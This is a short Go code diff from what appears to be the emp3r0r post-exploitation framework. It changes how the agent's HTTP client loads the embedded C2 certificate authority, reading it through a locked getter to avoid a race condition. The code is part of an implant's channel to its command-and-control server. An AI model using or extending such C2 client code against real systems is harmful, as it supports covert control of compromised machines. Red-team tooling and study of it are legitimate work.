@@ -57,7 +57,10 @@ func stdlibTLSConfig(c2Host string, rootCAs *x509.CertPool) *tls.Config {
 // CreateEmp3r0rHTTPClient returns an HTTP client that trusts the embedded C2 CA
 // and verifies the C2 against the configured real host, using crypto/tls.
 func CreateEmp3r0rHTTPClient(c2_addr, proxyServer string) *http.Client {
-	rootCAs, err := ExtractCABundle(CACrtPEM)
+	// Snapshot the CA under its lock: the C2 may publish it concurrently
+	// (SetCACrtPEM) while an agent builds a client.
+	caPEM := GetCACrtPEM()
+	rootCAs, err := ExtractCABundle(caPEM)
 	if err != nil {
 		logging.Fatalf("ExtractCABundle: %v", err)
 	}
@@ -71,12 +74,12 @@ func CreateEmp3r0rHTTPClient(c2_addr, proxyServer string) *http.Client {
 		logging.Fatalf("Error parsing C2 address '%s': %v", addr, err)
 	}
 
-	if ok := rootCAs.AppendCertsFromPEM(CACrtPEM); !ok {
+	if ok := rootCAs.AppendCertsFromPEM(caPEM); !ok {
 		logging.Fatalf("No CA certs appended")
 	}
 
 	c2_host := c2url.Hostname()
-	ca_crt, _ := ParsePem(CACrtPEM)
+	ca_crt, _ := ParsePem(caPEM)
 	logging.Infof("CA cert fingerprint: %s, now making HTTP transport", sha256SumRaw(ca_crt.Raw))
 
 	var proxyFunc func(*http.Request) (*url.URL, error)
@@ -179,7 +182,8 @@ func CreatePreflightHTTPClient(c2Addr string) *http.Client {
 		return nil
 	}
 
-	rootCAs, err := ExtractCABundle(CACrtPEM)
+	caPEM := GetCACrtPEM()
+	rootCAs, err := ExtractCABundle(caPEM)
 	if err != nil {
 		logging.Infof("ExtractCABundle: %v", err)
 		return nil
